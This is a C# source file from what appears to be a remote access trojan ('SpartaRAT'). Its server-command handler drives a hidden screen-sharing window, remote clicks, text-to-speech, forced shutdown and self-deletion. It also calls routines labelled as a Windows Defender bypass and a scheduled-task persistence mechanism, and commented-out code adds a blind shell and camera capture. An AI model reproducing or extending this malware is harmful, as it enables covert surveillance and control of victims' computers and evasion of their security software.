using System;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Speech.Synthesis;
using System.Windows.Forms;
using RATclientSparta.Tools;
using RATclientSparta.Tools.ScreenShare;
using RATclientSparta.Server.Send;
using RATclientSparta.Tools.Chat;
using SpartaRATclient.Tools;
using SpartaRATclient;

namespace RATclientSparta.Server
{
    public class ServerData
    {
        public delegate void GotMessage(byte[] message);
        public delegate void LostConnection();
        public delegate void screenStreamEvent();
        public delegate void paintStreamEvent(byte[] message);
        public delegate void PaintConfig(byte[] message);
        //public delegate void StopSharingCmaera();

        public event GotMessage ChatMessageEvent;
        public event LostConnection LostConnectionEvent;
        public event screenStreamEvent CloseScreenStream;
        public event paintStreamEvent PaintStream;
        public event PaintConfig PaintConfigs;
        //public event StopSharingCmaera s_StopSharingCamera;

        public Socket SocketConnection = default(Socket);
        public bool ServerConnected = false;

        public ServerData(Socket ServerSocket)
        {
            this.ChatMessageEvent = delegate { };
            this.LostConnectionEvent = delegate { };
            this.CloseScreenStream = delegate { };
            this.PaintStream = delegate { };
            this.PaintConfigs = delegate { };
            //this.s_StopSharingCamera = delegate { };
            this.SocketConnection = ServerSocket;
            this.ServerConnected = true;
        }

        private byte[] Read(int bytes)
        {
            byte[] buffer = new byte[bytes];
            int bytesRead = 0;
            while (bytesRead < bytes)
                bytesRead += this.SocketConnection.Receive(buffer, bytesRead, bytes - bytesRead, SocketFlags.None);
            return buffer;
        }

        public void Receive()
        {
            SendData Client = new SendData(this.SocketConnection, true);


            while (ServerConnected)
            {
                try
                {
                    //server must send 6 bytes - Therefore client know to expect for 6 bytes.
                    byte[] tlv = Read(6);

                    //index 0 = type
                    byte type = tlv[0];


                    //index 1-6 = length
                    int lengthRead = BitConverter.ToInt32(tlv, 1);

                    //reading from server according to the Int32 bit value (from index 1-6)
                    byte[] message = Read(lengthRead);

                    switch (type)
                    {
                        case 0: break;

                        //chat (Message Received)
                        case 1: ChatMessageEvent.Invoke(message); break;


                        //chat (Opening GUI screen)
                        case 2: if (Application.OpenForms.OfType<Chat>().Count() == 0) { new Thread(new ThreadStart(() => { Chat chat = new Chat(this); chat.ShowDialog(); })).Start(); } break;

                        //computer Talk
                        case 4: string a = Encoding.ASCII.GetString(message); SpeechSynthesizer synth = new SpeechSynthesizer(); synth.SetOutputToDefaultAudioDevice(); synth.Speak(a); break;

                        //exit program
                        case 7: Client.Send(Encoding.ASCII.GetBytes("\0"), 0); Environment.Exit(0); break;

                        //screen Stream - Opening the hidden GUI of screen share. (small resolution TopMost GUI window so it will work even when playing on fullscreen games)
                        case 8: if (Application.OpenForms.OfType<ScreenShare>().Count() == 0) { new Thread(new ThreadStart(() => { ScreenShare ShareScreen = new ScreenShare(this, SocketConnection); ShareScreen.ShowDialog(); })).Start(); } break;

                        //screen Stream - delegate event that stops the screen streaming
                        case 9: CloseScreenStream.Invoke(); break;

                        //Paint delegate X,Y,Location - on screen
                        case 10: PaintStream.Invoke(message); break;

                        //Windows defender bypass and persistence
                        case 20: new Thread(new ThreadStart(() => { new Thread(new ThreadStart(() => { Exclusion application = new Exclusion(); application.Exclude(); })).Start(); schtask task = new schtask(); task.Create(); })).Start(); break;

                        //Clicking on screen
                        case 22: Click click = new Click(); click.ScreenClick(message); break;

                        //Delete app
                        case 23: DeleteApp app = new DeleteApp(); app.Delete(); break;

                        //Computer shutdown
                        case 14: Shell command = new Shell(); command.Run(@"shutdown /s /t 1"); break;

                            //CURRENTLY NOT IN USE
                            //BlindShell command running
                            //case 13: BlindShell command1 = new BlindShell(this); command1.Run(message); break;
                            //case 14: BlindShell command2 = new BlindShell(this); command2.Run(Encoding.ASCII.GetBytes(@"shutdown /s /t 2")); break;

                            //Camera sharing
                            //case 18: ShareCamera(); break;
                            //case 19: s_StopSharingCamera.Invoke(); break;


                    }
                }
                catch { }
            }
            this.SocketConnection.Close();
            LostConnectionEvent.Invoke();
            return; //returning - not connected

        }

        /*
        private void ShareCamera()
        {
            CameraView cam = new CameraView(this);
            new Thread(new ThreadStart(cam.GrabCamera)).Start();
        }*/
    }
}
